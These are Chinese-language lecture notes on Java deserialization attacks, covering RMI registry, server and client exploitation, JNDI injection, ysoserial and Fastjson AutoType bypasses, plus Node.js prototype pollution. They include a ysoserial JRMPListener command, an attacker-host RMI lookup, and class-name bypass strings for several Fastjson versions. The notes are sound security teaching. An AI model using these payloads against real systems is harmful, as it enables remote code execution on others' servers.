<h6 id="6）Skeleton对象-08-57"><a href="#6）Skeleton对象-08-57" class="headerlink" title="6）Skeleton对象 08:57"></a>6）Skeleton对象 08:57</h6><ul>
<li><img src="https://cdn.nlark.com/yuque/0/2025/png/48605621/1759375427269-50f51a72-1136-4554-a5da-44bfec5b4489.png"></li>
<li>存在形式：每个远程对象同时包含Skeleton，运行在Server端</li>
<li>工作流程：<ul>
<li>反序列化Stub传来的参数</li>
<li>调用远程对象对应方法</li>
<li>序列化结果&#x2F;错误返回给Stub</li>
</ul>
</li>
</ul>
<h6 id="7）RMI中的基本操作-10-01"><a href="#7）RMI中的基本操作-10-01" class="headerlink" title="7）RMI中的基本操作 10:01"></a>7）RMI中的基本操作 10:01</h6><ul>
<li><img src="/"></li>
<li>关键操作：lookup、bind、unbind、list、rebind</li>
</ul>
<h6 id="8）RMI-Client代码分析-10-15"><a href="#8）RMI-Client代码分析-10-15" class="headerlink" title="8）RMI Client代码分析 10:15"></a>8）RMI Client代码分析 10:15</h6><ul>
<li><img src="https://cdn.nlark.com/yuque/0/2025/png/48605621/1759375567327-75728dd1-7250-45ca-8b4a-d4a48640bc11.png"></li>
<li>核心步骤：<ul>
<li>获取Registry实例：LocateRegistry.getRegistry(“127.0.0.1”,8888)</li>
<li>查找远程对象：registry.lookup(“user”)</li>
</ul>
</li>
<li>操作原理：lookup通过键名获取绑定的远程对象信息</li>
</ul>
<h6 id="9）RMI-Server-Registry代码分析-11-41"><a href="#9）RMI-Server-Registry代码分析-11-41" class="headerlink" title="9）RMI Server &amp; Registry代码分析 11:41"></a>9）RMI Server &amp; Registry代码分析 11:41</h6><ul>
<li><img src="https://cdn.nlark.com/yuque/0/2025/png/48605621/1759375703383-4a28d971-0f81-4328-a5d2-b975be31d044.png"></li>
<li>接口规范：<ul>
<li>必须继承java.rmi.Remote</li>
<li>方法需声明throws RemoteException</li>
<li>示例方法：getName(), getUser(), updateName()</li>
<li><img src="/"></li>
</ul>
</li>
<li>实现要求：<ul>
<li>继承UnicastRemoteObject</li>
<li>实现自定义接口（如User）</li>
<li>包含Stub&#x2F;Skeleton生成能力</li>
</ul>
</li>
<li>典型字段：name, age等业务属性</li>
<li></li>
<li>部署过程：<ul>
<li>实例化远程对象：new LocalUser(“liming”,15)</li>
<li>创建Registry：LocateRegistry.createRegistry(8888)</li>
<li>绑定服务：registry.bind(“user”,liming)</li>
</ul>
</li>
<li>架构说明：实际部署时Server和Registry可分离，示例为简化采用同机部署</li>
</ul>
<h5 id="2-RMI利用手法-15-24"><a href="#2-RMI利用手法-15-24" class="headerlink" title="2. RMI利用手法 15:24"></a>2. RMI利用手法 15:24</h5><ul>
<li><img src="https://cdn.nlark.com/yuque/0/2025/png/48605621/1759376238142-d05b79d9-c31e-4cc9-82fe-a901d372822a.png"></li>
</ul>
<h6 id="1）针对注册中心利用方式-16-56"><a href="#1）针对注册中心利用方式-16-56" class="headerlink" title="1）针对注册中心利用方式 16:56"></a>1）针对注册中心利用方式 16:56</h6><p>+ </p>
<ul>
<li>基本操作类型：包含bind、unbind、lookup、rebind和list五种核心操作</li>
<li>bind&#x2F;rebind漏洞原理：<ul>
<li>接收两个参数：StringStringString类型键值和远程对象</li>
<li>远程对象反序列化时可能执行恶意代码</li>
<li>示例：将正常远程对象替换为恶意序列化对象</li>
</ul>
</li>
<li>unbind&#x2F;lookup限制突破：<ul>
<li>仅接收StringStringString类型单参数</li>
<li>原始实现会进行参数类型校验</li>
<li>绕过方法：伪造连接请求跳过校验层<ul>
<li>修改RMI底层实现代码</li>
<li>删除StringStringString类型校验逻辑</li>
</ul>
</li>
</ul>
</li>
</ul>
<h6 id="2）针对服务端利用方式-19-26"><a href="#2）针对服务端利用方式-19-26" class="headerlink" title="2）针对服务端利用方式 19:26"></a>2）针对服务端利用方式 19:26</h6><ul>
<li><img src="https://cdn.nlark.com/yuque/0/2025/png/48605621/1759376255366-59f03099-91df-488c-8255-180c11769511.png"></li>
<li>必要前提：服务端远程方法参数为ObjectObjectObject类型<ul>
<li>区别于基本数据类型（如StringStringString,intintint等）</li>
<li>示例：addUser(Object user)addUser(Object\ user)addUser(Object user)方法</li>
</ul>
</li>
<li>攻击流程：<ul>
<li>正常lookuplookuplookup获取服务引用</li>
<li>调用目标方法传入恶意序列化对象</li>
<li>服务端反序列化触发漏洞</li>
</ul>
</li>
<li>关键特征：参数类型声明为ObjectObjectObject使得对象反序列化成为可能</li>
</ul>
<h6 id="3）针对客户端利用方式-21-13"><a href="#3）针对客户端利用方式-21-13" class="headerlink" title="3）针对客户端利用方式 21:13"></a>3）针对客户端利用方式 21:13</h6><ul>
<li><img src="https://cdn.nlark.com/yuque/0/2025/png/48605621/1759376347116-62e56200-8e6a-4209-bb83-fb8b68d3f755.png"></li>
<li>服务端→客户端攻击：<ul>
<li>伪造服务端返回恶意序列化结果</li>
<li>客户端反序列化响应时触发漏洞</li>
</ul>
</li>
<li>注册中心→客户端攻击：<ul>
<li>使用JRMPListenerJRMPListenerJRMPListener工具建立恶意服务<ul>
<li>命令示例：java −cp ysoserial.jar ysoserial.exploit.JRMPListener 12345 CommonsCollections5 ′open &#x2F;System&#x2F;Calculator.app′java\ -cp\ ysoserial.jar\ ysoserial.exploit.JRMPListener\ 12345\ CommonsCollections5\ ‘open\ &#x2F;System&#x2F;Calculator.app’java −cp ysoserial.jar ysoserial.exploit.JRMPListener 12345 CommonsCollections5 ′open &#x2F;System&#x2F;Calculator.app′</li>
</ul>
</li>
<li>构造JRMPClientJRMPClientJRMPClient序列化对象<ul>
<li>指定连接至恶意服务地址</li>
<li>触发二次连接实现漏洞利用</li>
</ul>
</li>
</ul>
</li>
<li>协议关系：RMI基于JRMP协议实现，故JRMP层面的攻击同样有效</li>
<li><img src="https://cdn.nlark.com/yuque/0/2025/png/48605621/1759376395840-34ce5376-2096-45c2-a2e8-c5dc8ff3b6fd.png"></li>
</ul>
<h4 id="一、JNDI协议-00-23"><a href="#一、JNDI协议-00-23" class="headerlink" title="一、JNDI协议 00:23"></a>一、JNDI协议 00:23</h4><h5 id="1-什么是JNDI-00-28"><a href="#1-什么是JNDI-00-28" class="headerlink" title="1. 什么是JNDI 00:28"></a>1. 什么是JNDI 00:28</h5><ul>
<li><img src="https://cdn.nlark.com/yuque/0/2025/jpeg/48605621/1759396211698-f89e980d-b9c1-470a-af32-529b79358d4d.jpeg"></li>
<li>定义: Java Naming and Directory Interface，是Java的命名服务接口协议，允许客户端通过名称发现和查找指定数据。</li>
<li>命名服务: 将名称和对象进行关联，提供通过名称找到对象的操作，类似RMI中的注册中心机制。</li>
<li>名称(Name): 字符串形式的key，用于在命名系统中查找对象。</li>
<li>绑定(Binding): 名称和对象的关联关系，是逻辑概念而非具体对象。</li>
<li>引用(Reference): 命名服务系统可能不直接存储对象，而是保持对象引用（如远程机器地址）。</li>
<li>上下文(Context): 一系列名称和对象绑定的集合，功能类似RMI注册中心。</li>
</ul>
<h5 id="2-JNDI动态协议转换-05-06"><a href="#2-JNDI动态协议转换-05-06" class="headerlink" title="2. JNDI动态协议转换 05:06"></a>2. JNDI动态协议转换 05:06</h5><ul>
<li><img src="https://cdn.nlark.com/yuque/0/2025/jpeg/48605621/1759396211667-39d3929d-7961-4aad-9116-a6c8fc62c316.jpeg"></li>
<li>核心特性: 根据传入URL协议自动转换对应Factory和Provider URL</li>
<li>自动识别机制:<ul>
<li>识别协议头（如rmi:&#x2F;&#x2F;, ldap:&#x2F;&#x2F;, iiop:&#x2F;&#x2F;）</li>
<li>动态选择底层协议解析功能</li>
</ul>
</li>
<li>两种配置方式:<ul>
<li>直接通过URL协议头触发：ctx.lookup(“rmi:&#x2F;&#x2F;attacker-server&#x2F;refobj”)</li>
<li>通过环境变量初始化后覆盖：初始化时设置RMI环境，但lookup时使用LDAP协议</li>
</ul>
</li>
<li>安全风险: 协议头可控时可能被攻击者利用进行协议转换攻击</li>
</ul>
<h5 id="3-JNDI与RMI的配合使用-08-42"><a href="#3-JNDI与RMI的配合使用-08-42" class="headerlink" title="3. JNDI与RMI的配合使用 08:42"></a>3. JNDI与RMI的配合使用 08:42</h5><ul>
<li><img src="https://cdn.nlark.com/yuque/0/2025/jpeg/48605621/1759396211767-200db7b3-6311-4777-8ec3-ee12300d2a1c.jpeg"></li>
<li>初始化配置:</li>
<li>操作一致性:<ul>
<li>支持RMI的bind操作：ctx.bind(“refobj”, new RefObject())</li>
<li>支持RMI的lookup操作：ctx.lookup(“refobj”)</li>
</ul>
</li>
<li>注意事项: Factory配置必须与协议类型严格匹配，否则会导致执行异常</li>
</ul>
<h5 id="4-Reference可以使用工厂来构造对象-11-00"><a href="#4-Reference可以使用工厂来构造对象-11-00" class="headerlink" title="4. Reference可以使用工厂来构造对象 11:00"></a>4. Reference可以使用工厂来构造对象 11:00</h5><ul>
<li><img src="https://cdn.nlark.com/yuque/0/2025/jpeg/48605621/1759396211604-d82c2574-0432-4204-9ae7-4f33a410361f.jpeg"></li>
<li>工作流程:<ul>
<li>创建Reference对象：new Reference(“MyClass”,”MyClass”,FactoryURL)</li>
<li>包装为ReferenceWrapper</li>
<li>通过bind操作绑定到命名服务</li>
</ul>
</li>
<li>动态加载机制:<ul>
<li>lookup时会根据factoryURL下载指定class文件</li>
<li>在本地加载并实例化工厂类</li>
<li>工厂类构造最终需要的对象</li>
</ul>
</li>
<li>关键区别: 与RMI不同，实际对象构造发生在客户端本地而非服务端</li>
</ul>
<h5 id="5-JNDI注入lookup地址可控时进行的利用方式-12-46"><a href="#5-JNDI注入lookup地址可控时进行的利用方式-12-46" class="headerlink" title="5. JNDI注入lookup地址可控时进行的利用方式 12:46"></a>5. JNDI注入lookup地址可控时进行的利用方式 12:46</h5><ul>
<li><img src="https://cdn.nlark.com/yuque/0/2025/jpeg/48605621/1759396211701-9becbe38-851e-4c67-bd17-c860f278161e.jpeg"></li>
<li>攻击准备:<ul>
<li>创建恶意类：包含命令执行的构造函数</li>
<li>编译为class文件并托管在HTTP服务</li>
<li>注册中心绑定Reference指向恶意class</li>
</ul>
</li>
<li>利用条件: 客户端存在可控的lookup参数</li>
<li>攻击流程:</li>
<li>触发方式: 客户端调用ctx.lookup(“rmi:&#x2F;&#x2F;attacker&#x2F;aa”)</li>
</ul>
<h5 id="6-为什么远端的函数在本地被执行了-16-09"><a href="#6-为什么远端的函数在本地被执行了-16-09" class="headerlink" title="6. 为什么远端的函数在本地被执行了 16:09"></a>6. 为什么远端的函数在本地被执行了 16:09</h5><ul>
<li><img src="https://cdn.nlark.com/yuque/0/2025/jpeg/48605621/1759396212765-d2dc4ebe-e760-42be-a2ab-0dd5cb939ff3.jpeg"></li>
<li>核心机制:<ul>
<li>实际绑定的是命名引用而非对象</li>
<li>lookup时下载远程class到本地</li>
<li>在客户端本地完成加载和实例化</li>
</ul>
</li>
<li>与RMI的本质区别:<ul>
<li>RMI: 服务端执行后返回结果</li>
<li>JNDI+Reference: 客户端本地执行恶意代码</li>
</ul>
</li>
<li>攻击链:<ul>
<li>客户端发起lookup请求</li>
<li>获取Reference信息</li>
<li>根据factoryURL下载class</li>
<li>本地加载并执行构造函数</li>
</ul>
</li>
</ul>
<h4 id="二、ysoserial使用方法-18-39"><a href="#二、ysoserial使用方法-18-39" class="headerlink" title="二、ysoserial使用方法 18:39"></a>二、ysoserial使用方法 18:39</h4><h5 id="1-什么是ysoserial-18-48"><a href="#1-什么是ysoserial-18-48" class="headerlink" title="1. 什么是ysoserial 18:48"></a>1. 什么是ysoserial 18:48</h5><ul>
<li><img src="https://cdn.nlark.com/yuque/0/2025/jpeg/48605621/1759396212768-70044a87-834f-4d8d-a31b-b2c11c0ee974.jpeg"></li>
<li>工具定位: Java反序列化漏洞的半自动化利用工具</li>
<li>主要功能:<ul>
<li>生成特定payload</li>
<li>直接漏洞利用</li>
<li>运行Java协议监听服务</li>
</ul>
</li>
<li>局限性: 只能完成漏洞利用链中的特定环节</li>
</ul>
<h5 id="2-Payload模块-19-45"><a href="#2-Payload模块-19-45" class="headerlink" title="2. Payload模块 19:45"></a>2. Payload模块 19:45</h5><ul>
<li><img src="https://cdn.nlark.com/yuque/0/2025/jpeg/48605621/1759396212869-01c0c171-6c3b-455f-b28b-57017a41bd5b.jpeg"></li>
<li>Payload类型:<ul>
<li>CommonsCollections1-4</li>
<li>BeanShell1</li>
<li>C3P0</li>
<li>Jdk7u21等</li>
</ul>
</li>
<li>生成原理: 根据组件依赖关系组装利用链</li>
<li>命名规则: 依赖包名称+编号（如commons collections1）</li>
</ul>
<h5 id="3-ysoserial生成payload方式-21-25"><a href="#3-ysoserial生成payload方式-21-25" class="headerlink" title="3. ysoserial生成payload方式 21:25"></a>3. ysoserial生成payload方式 21:25</h5><ul>
<li><img src="https://cdn.nlark.com/yuque/0/2025/jpeg/48605621/1759396213046-c10c3c12-1137-43f3-8452-2cea7f483360.jpeg"></li>
<li>标准结构:<ul>
<li>getObject方法：组装恶意类</li>
<li>main方法：运行生成流程</li>
</ul>
</li>
<li>示例(URLDNS):</li>
</ul>
<h5 id="4-如何使用ysoserial-21-59"><a href="#4-如何使用ysoserial-21-59" class="headerlink" title="4. 如何使用ysoserial 21:59"></a>4. 如何使用ysoserial 21:59</h5><ul>
<li><img src="https://cdn.nlark.com/yuque/0/2025/jpeg/48605621/1759396213401-496d56ea-17ae-40f6-b4c7-76a57cf8f461.jpeg"></li>
<li>Payload模块用法:</li>
<li>Exploit模块用法:</li>
<li>JRMPListener示例:</li>
</ul>
<h4 id="一、Fastjson的反序列化漏洞-00-01"><a href="#一、Fastjson的反序列化漏洞-00-01" class="headerlink" title="一、Fastjson的反序列化漏洞 00:01"></a>一、Fastjson的反序列化漏洞 00:01</h4><h5 id="1-Fastjson反序列化原理介绍-00-23"><a href="#1-Fastjson反序列化原理介绍-00-23" class="headerlink" title="1. Fastjson反序列化原理介绍 00:23"></a>1. Fastjson反序列化原理介绍 00:23</h5><h6 id="1）什么是Fastjson-00-32"><a href="#1）什么是Fastjson-00-32" class="headerlink" title="1）什么是Fastjson 00:32"></a>1）什么是Fastjson 00:32</h6><ul>
<li>功能：Fastjson是一个Java库，用于解析和处理JSON格式数据，实现Java对象与JSON数据间的互相转换</li>
<li>POJO对象处理：能够处理具有基本类型成员变量和对应get&#x2F;set方法的Java对象（POJO对象），如Car类包含price&#x2F;size等属性</li>
<li>转换本质：JSON与Java对象的转换过程就是序列化（对象→文本）和反序列化（文本→对象）</li>
</ul>
<h6 id="2）为什么Fastjson会有反序列化漏洞-02-36"><a href="#2）为什么Fastjson会有反序列化漏洞-02-36" class="headerlink" title="2）为什么Fastjson会有反序列化漏洞 02:36"></a>2）为什么Fastjson会有反序列化漏洞 02:36</h6><ul>
<li><img src="https://cdn.nlark.com/yuque/0/2025/png/48605621/1759397522832-ce5b16d2-8815-4485-986f-84cc25352af4.png"></li>
<li>根本原因：将JSON数据转换为Java对象时未对目标对象进行校验</li>
<li>攻击原理：攻击者可篡改反序列化生成的目标对象为恶意对象，控制危险操作</li>
<li>fastjson的jndi注入payload示例 03:05<ul>
<li><img src="https://cdn.nlark.com/yuque/0/2025/png/48605621/1759397559171-308989ee-c3c6-428e-a974-4f7f437b171d.png"></li>
<li>payload结构：</li>
<li>关键字段：@type指定反序列化目标类，dataSourceName设置恶意LDAP&#x2F;RMI地址</li>
</ul>
</li>
<li>AutoType机制 04:01<ul>
<li>作用：解决接口&#x2F;抽象类在序列化时子类型丢失问题</li>
<li>实现方式：通过@type字段显式指定反序列化类型</li>
<li>安全隐患：允许攻击者指定任意类进行反序列化</li>
<li>示例类讲解 05:10<ul>
<li><img src="https://cdn.nlark.com/yuque/0/2025/png/48605621/1759397580057-8c2f14af-9d18-4e5a-90d2-b0c8a3fe824a.png"></li>
<li>Store类：包含String name和Fruit fruit字段</li>
<li>Fruit接口：被Apple类实现（含BigDecimal price）</li>
<li>序列化问题：当存储Apple实例时，序列化结果只保留Fruit类型信息，丢失具体Apple类型</li>
<li><img src="https://cdn.nlark.com/yuque/0/2025/png/48605621/1759397692452-525e50cb-7db6-40bd-8d3a-c337a4a0ca78.png"></li>
<li>无类型信息：{“fruit”:{“price”:0.5},”name”:”Hollis”}</li>
<li>带类型信息：使用SerializerFeature.WriteClassName后包含完整类型信息</li>
</ul>
</li>
</ul>
</li>
</ul>
<h6 id="3）fastjson中对于json数据的核心处理流程位置-08-53"><a href="#3）fastjson中对于json数据的核心处理流程位置-08-53" class="headerlink" title="3）fastjson中对于json数据的核心处理流程位置 08:53"></a>3）fastjson中对于json数据的核心处理流程位置 08:53</h6><ul>
<li><img src="https://cdn.nlark.com/yuque/0/2025/png/48605621/1759397738976-da6e4682-221a-48a1-b506-7d9448d10815.png"></li>
<li>核心类：DefaultJSONParser#parse(Object fieldName)</li>
<li>处理逻辑：<ul>
<li>识别标准key-value结构</li>
<li>遇到特殊标志位（如@type、$ref）进入特殊处理分支</li>
<li>嵌套结构递归处理</li>
</ul>
</li>
</ul>
<h6 id="4）创建JavaBeanDeserializer-09-54"><a href="#4）创建JavaBeanDeserializer-09-54" class="headerlink" title="4）创建JavaBeanDeserializer 09:54"></a>4）创建JavaBeanDeserializer 09:54</h6><ul>
<li><img src="https://cdn.nlark.com/yuque/0/2025/png/48605621/1759397790116-d9a18585-7e27-4e1c-9972-3f7475353a81.png"></li>
<li>初始化过程：<ul>
<li>扫描字段信息（如name&#x2F;price等）</li>
<li>将字段转换为FieldDeserializer</li>
<li>最终调用deserialze方法完成反序列化</li>
</ul>
</li>
<li>关键方法：通过反射调用setter方法设置字段值</li>
</ul>
<h5 id="2-Fastjson的反序列化基础利用-12-14"><a href="#2-Fastjson的反序列化基础利用-12-14" class="headerlink" title="2. Fastjson的反序列化基础利用 12:14"></a>2. Fastjson的反序列化基础利用 12:14</h5><h6 id="1）最初的payload示例"><a href="#1）最初的payload示例" class="headerlink" title="1）最初的payload示例"></a>1）最初的payload示例</h6><ul>
<li><img src="https://cdn.nlark.com/yuque/0/2025/png/48605621/1759397877274-fde2fd20-bcb9-4dc2-85ec-1085007a7343.png"></li>
<li>经典payload：</li>
<li><h2 id="攻击链分析：-通过-type指定恶意类JdbcRowSetImpl-setDataSourceName设置LDAP恶意地址-setAutoCommit-true-触发connect-方法-connect-内部调用InitialContext-lookup-实现JNDI注入"><a href="#攻击链分析：-通过-type指定恶意类JdbcRowSetImpl-setDataSourceName设置LDAP恶意地址-setAutoCommit-true-触发connect-方法-connect-内部调用InitialContext-lookup-实现JNDI注入" class="headerlink" title="攻击链分析：  - 通过@type指定恶意类JdbcRowSetImpl  - setDataSourceName设置LDAP恶意地址  - setAutoCommit(true)触发connect()方法  - connect()内部调用InitialContext().lookup()实现JNDI注入"></a>攻击链分析：<br>  - 通过@type指定恶意类JdbcRowSetImpl<br>  - setDataSourceName设置LDAP恶意地址<br>  - setAutoCommit(true)触发connect()方法<br>  - connect()内部调用InitialContext().lookup()实现JNDI注入</h2></li>
<li>关键调用链：<ul>
<li>setAutoCommit() → connect() → InitialContext().lookup()</li>
<li>通过可控的dataSourceName参数实现远程代码执行</li>
</ul>
</li>
</ul>
<h4 id="一、阶层反序列化漏洞的第二个环节-00-00"><a href="#一、阶层反序列化漏洞的第二个环节-00-00" class="headerlink" title="一、阶层反序列化漏洞的第二个环节 00:00"></a>一、阶层反序列化漏洞的第二个环节 00:00</h4><h5 id="1-内容目录-00-05"><a href="#1-内容目录-00-05" class="headerlink" title="1. 内容目录 00:05"></a>1. 内容目录 00:05</h5><ul>
<li>课程结构：本节课程分为三个部分：FastJson无防护版本的反序列化漏洞利用、AutoType黑名单机制的初步对抗、以及FastJson通过class缓存机制的利用方式。</li>
</ul>
<h5 id="2-无防护的最初利用-00-29"><a href="#2-无防护的最初利用-00-29" class="headerlink" title="2. 无防护的最初利用 00:29"></a>2. 无防护的最初利用 00:29</h5><h6 id="1）JdbcRowSetImpl类利用"><a href="#1）JdbcRowSetImpl类利用" class="headerlink" title="1）JdbcRowSetImpl类利用"></a>1）JdbcRowSetImpl类利用</h6><p>+ </p>
<ul>
<li>漏洞背景：在FastJson 1.2.24版本中首次曝出JNDI注入漏洞，该版本没有任何防御措施。</li>
<li>利用方式：直接通过AutoType机制反序列化恶意类，示例payload：</li>
<li>利用原理：JNDI注入只是其中一种利用形式，具体攻击原理与上节课程内容相同。</li>
</ul>
<h6 id="2）利用TemplatesImpl类-01-16"><a href="#2）利用TemplatesImpl类-01-16" class="headerlink" title="2）利用TemplatesImpl类 01:16"></a>2）利用TemplatesImpl类 01:16</h6><p>+ </p>
<ul>
<li>基本原理：通过bytecode还原类文件并实例化，执行恶意代码。</li>
<li>实现步骤：<ul>
<li>读取恶意class文件并进行base64编码</li>
<li>将编码后的内容插入到_bytecodes字段</li>
<li>TemplatesImpl会解码并还原类到JVM中</li>
</ul>
</li>
<li><h2 id="关键要求：-类必须继承特定抽象类（如AbstractTranslet）-需要重写指定的transform方法-恶意代码通常放在构造函数或静态代码块中"><a href="#关键要求：-类必须继承特定抽象类（如AbstractTranslet）-需要重写指定的transform方法-恶意代码通常放在构造函数或静态代码块中" class="headerlink" title="关键要求：  - 类必须继承特定抽象类（如AbstractTranslet）  - 需要重写指定的transform方法  - 恶意代码通常放在构造函数或静态代码块中"></a>关键要求：<br>  - 类必须继承特定抽象类（如AbstractTranslet）<br>  - 需要重写指定的transform方法<br>  - 恶意代码通常放在构造函数或静态代码块中</h2></li>
<li>示例代码：展示了一个继承AbstractTranslet的恶意类TEMPOC，在其构造函数中执行系统命令Runtime.getRuntime().exec(“open -a Calculator”)</li>
<li>生成方式：使用javac TEMPOC.java命令生成class文件</li>
<li>最终payload结构：</li>
<li>执行流程：<ul>
<li>FastJson解析JSON时实例化TemplatesImpl</li>
<li>解码并加载_bytecodes中的恶意类</li>
<li>执行类的构造函数或静态代码块中的恶意代码</li>
</ul>
</li>
</ul>
<h5 id="3-AutoType黑名单对抗-03-31"><a href="#3-AutoType黑名单对抗-03-31" class="headerlink" title="3. AutoType黑名单对抗 03:31"></a>3. AutoType黑名单对抗 03:31</h5><p>+ </p>
<ul>
<li>默认设置: FastJson从1.2.25版本开始默认关闭AutoType机制，开发者需手动开启</li>
<li>防御实现: 主要通过checkAutoType函数实现，包含四个检测模块</li>
<li>黑白名单机制:<ul>
<li>白名单类直接通过验证并加载</li>
<li>黑名单类直接抛出JSONException异常</li>
</ul>
</li>
</ul>
<h6 id="1）黑名单对抗简介-05-56"><a href="#1）黑名单对抗简介-05-56" class="headerlink" title="1）黑名单对抗简介 05:56"></a>1）黑名单对抗简介 05:56</h6><p>+ </p>
<ul>
<li>缓存检查:<ul>
<li>首先从类缓存mapping中查找指定类信息</li>
<li>若找到且expectClass不匹配则抛出类型异常</li>
</ul>
</li>
<li><h2 id="加载条件-必须开启AutoType支持或指定expectClass-通过TypeUtils-loadClass完成最终类加载"><a href="#加载条件-必须开启AutoType支持或指定expectClass-通过TypeUtils-loadClass完成最终类加载" class="headerlink" title="加载条件:  - 必须开启AutoType支持或指定expectClass  - 通过TypeUtils.loadClass完成最终类加载"></a>加载条件:<br>  - 必须开启AutoType支持或指定expectClass<br>  - 通过TypeUtils.loadClass完成最终类加载</h2></li>
<li>1.2.25-1.2.41绕过:<ul>
<li>方法: 在类名前加LLL、后加;;;</li>
<li>原理: loadClass会去除首尾特殊字符</li>
<li>示例:Lcom.sun.rowset.JdbcRowSetImpl;Lcom.sun.rowset.JdbcRowSetImpl;Lcom.sun.rowset.JdbcRowSetImpl;</li>
</ul>
</li>
<li>1.2.42绕过:<ul>
<li>方法: 使用双LLLLLL前缀</li>
<li>原理: checkAutoType只做单次截取</li>
<li>示例:LLcom.sun.rowset.JdbcRowSetImpl;;LLcom.sun.rowset.JdbcRowSetImpl;;LLcom.sun.rowset.JdbcRowSetImpl;;</li>
</ul>
</li>
<li>1.2.43绕过:<ul>
<li>方法: 使用数组格式[[[</li>
<li>原理: loadClass按数组格式解析</li>
<li>示例:[com.sun.rowset.JdbcRowSetImpl[com.sun.rowset.JdbcRowSetImpl[com.sun.rowset.JdbcRowSetImpl</li>
</ul>
</li>
</ul>
<h5 id="4-Class缓存机制"><a href="#4-Class缓存机制" class="headerlink" title="4. Class缓存机制"></a>4. Class缓存机制</h5><h6 id="1）Class缓存机制绕过示例-08-52"><a href="#1）Class缓存机制绕过示例-08-52" class="headerlink" title="1）Class缓存机制绕过示例 08:52"></a>1）Class缓存机制绕过示例 08:52</h6><p>+ </p>
<ul>
<li>绕过原理：在FastJson 1.2.47版本中，首次出现不开启AutoType也能成功利用的反序列化漏洞。通过构造特殊JSON，先利用java.lang.Class加载目标类到缓存，后续直接调用时绕过黑白名单校验。</li>
<li>POC结构：</li>
<li>关键步骤：<ul>
<li>缓存注入：通过java.lang.Class将JdbcRowSetImpl类加载到TypeUtils.mappings缓存中</li>
<li>绕过校验：后续直接使用JdbcRowSetImpl时，由于已在缓存中，跳过AutoType检查</li>
</ul>
</li>
<li>代码分析：<ul>
<li>TypeUtils.loadClass()会将类名和Class对象存入mappings</li>
<li>getClassFromMapping()优先从缓存获取类对象，不进行黑白名单校验</li>
</ul>
</li>
</ul>
<h6 id="2）另一种绕过手法"><a href="#2）另一种绕过手法" class="headerlink" title="2）另一种绕过手法"></a>2）另一种绕过手法</h6><p>+ </p>
<ul>
<li>新型POC：</li>
<li>绕过机制：<ul>
<li>AutoCloseable特性：不在黑名单中，且被自动加载到mappings</li>
<li>expectClassFlag机制：当expectClass为AutoCloseable时标志位为true，绕过autoTypeSupport检查</li>
<li>嵌套利用：通过多层@type构造完整利用链</li>
</ul>
</li>
<li>代码关键点：<ul>
<li>checkAutoType()中expectClassFlag判断逻辑存在缺陷</li>
<li>addBaseClassMappings()会将AutoCloseable加入缓存</li>
<li>通过isAssignableFrom()检查时，AutoCloseable不被识别为危险接口</li>
</ul>
</li>
</ul>
<h4 id="一、原型链以及原型链污染-00-08"><a href="#一、原型链以及原型链污染-00-08" class="headerlink" title="一、原型链以及原型链污染 00:08"></a>一、原型链以及原型链污染 00:08</h4><h5 id="1-Javascript函数特点-00-33"><a href="#1-Javascript函数特点-00-33" class="headerlink" title="1. Javascript函数特点 00:33"></a>1. Javascript函数特点 00:33</h5><p>+ </p>
<ul>
<li>函数本质：在JavaScript中，每个函数实际上都是一个Function对象，可通过(function(){}).constructor &#x3D;&#x3D;&#x3D; Function验证</li>
<li>匿名函数：无函数名的函数定义方式，如function(){}可直接作为对象使用</li>
</ul>
<h6 id="1）Function作为类可以进行new操作-02-11"><a href="#1）Function作为类可以进行new操作-02-11" class="headerlink" title="1）Function作为类可以进行new操作 02:11"></a>1）Function作为类可以进行new操作 02:11</h6><p>+ </p>
<ul>
<li>实例化过程：<ul>
<li>创建来自A.prototype的新对象</li>
<li>调用构造函数并将this绑定到新对象</li>
</ul>
</li>
<li>示例验证：</li>
</ul>
<h6 id="2）实例对象私有属性-05-13"><a href="#2）实例对象私有属性-05-13" class="headerlink" title="2）实例对象私有属性 05:13"></a>2）实例对象私有属性 05:13</h6><p>+ </p>
<ul>
<li>原型继承：</li>
<li>自动传递：未显式赋值的prototype属性会自动传递给实例对象</li>
</ul>
<h5 id="2-原型链-09-26"><a href="#2-原型链-09-26" class="headerlink" title="2. 原型链 09:26"></a>2. 原型链 09:26</h5><p>+ </p>
<ul>
<li>核心关系：<ul>
<li>demo.<em>proto</em> &#x3D;&#x3D;&#x3D; test.prototype（返回true）</li>
<li>prototype是类的属性，实例化时继承所有内容</li>
<li>_proto_指向当前对象所在类的prototype</li>
</ul>
</li>
<li>链式搜索：访问属性时沿原型链向上查找，直到找到或到达链末端</li>
</ul>
<h5 id="3-修改proto影响对象取值-13-47"><a href="#3-修改proto影响对象取值-13-47" class="headerlink" title="3. 修改proto影响对象取值 13:47"></a>3. 修改proto影响对象取值 13:47</h5><p>+ </p>
<ul>
<li>污染原理：</li>
<li>关键条件：对象必须来自同一个类（同一条原型链）</li>
</ul>
<h5 id="4-原型链污染特点-16-07"><a href="#4-原型链污染特点-16-07" class="headerlink" title="4. 原型链污染特点 16:07"></a>4. 原型链污染特点 16:07</h5><p>+ </p>
<ul>
<li>常见场景：键值对赋值操作中_proto_作为有效键名</li>
<li>污染途径：通过修改原型对象影响所有同源实例</li>
</ul>
<h5 id="5-应用案例-16-42"><a href="#5-应用案例-16-42" class="headerlink" title="5. 应用案例 16:42"></a>5. 应用案例 16:42</h5><h6 id="1）例题-原型链污染攻击示例"><a href="#1）例题-原型链污染攻击示例" class="headerlink" title="1）例题:原型链污染攻击示例"></a>1）例题:原型链污染攻击示例</h6><p>+ </p>
<ul>
<li>攻击过程：</li>
<li>污染效果：所有空对象实例都会继承被污染的属性</li>
</ul>
<h4 id="二、NodeJS中的原型链模板注入-19-27"><a href="#二、NodeJS中的原型链模板注入-19-27" class="headerlink" title="二、NodeJS中的原型链模板注入 19:27"></a>二、NodeJS中的原型链模板注入 19:27</h4><h5 id="1-利用原型链模板注入-19-34"><a href="#1-利用原型链模板注入-19-34" class="headerlink" title="1. 利用原型链模板注入 19:34"></a>1. 利用原型链模板注入 19:34</h5><h6 id="1）例题-lodash-template污染源URL实现RCE-19-37"><a href="#1）例题-lodash-template污染源URL实现RCE-19-37" class="headerlink" title="1）例题:lodash.template污染源URL实现RCE 19:37"></a>1）例题:lodash.template污染源URL实现RCE 19:37</h6><p>+ </p>
<ul>
<li>攻击向量：</li>
<li>执行机制：污染sourceURL使其作为函数内容拼接执行</li>
</ul>
<h6 id="2）例题-lodash-merge原型链污染-21-36"><a href="#2）例题-lodash-merge原型链污染-21-36" class="headerlink" title="2）例题:lodash.merge原型链污染 21:36"></a>2）例题:lodash.merge原型链污染 21:36</h6><p>+ </p>
<ul>
